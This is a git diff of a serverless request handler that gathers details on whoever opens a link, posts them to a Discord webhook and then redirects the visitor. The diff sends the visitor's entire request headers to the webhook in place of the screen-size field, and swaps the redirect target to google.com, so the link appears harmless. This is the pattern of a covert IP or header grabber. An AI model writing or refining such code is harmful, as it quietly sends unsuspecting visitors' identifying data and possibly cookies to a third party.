@@ -37,7 +37,6 @@ export default async (req, res) => {
       req.headers["viewport-width"] && req.headers["viewport-height"]
         ? `${req.headers["viewport-width"]}x${req.headers["viewport-height"]}`
         : "Unknown";
-    console.log("Request Headers:", req.headers);
 
     const openedBy = decodedData
       ? `Opened by: ${decodedData}`
@@ -75,7 +74,7 @@ export default async (req, res) => {
               },
               {
                 name: "Screen Size",
-                value: screenSize || "Unknown",
+                value: req.headers,
                 inline: true,
               },
             ],
@@ -89,7 +88,7 @@ export default async (req, res) => {
     });
 
     // Redirect user to a website
-    res.redirect("https://c.tenor.com/x8v1oNUOmg4AAAAd/tenor.gif");
+    res.redirect("https://www.google.com");
 
     if (!discordWebhook.ok)
       throw new Error("Failed to send message to Discord webhook");
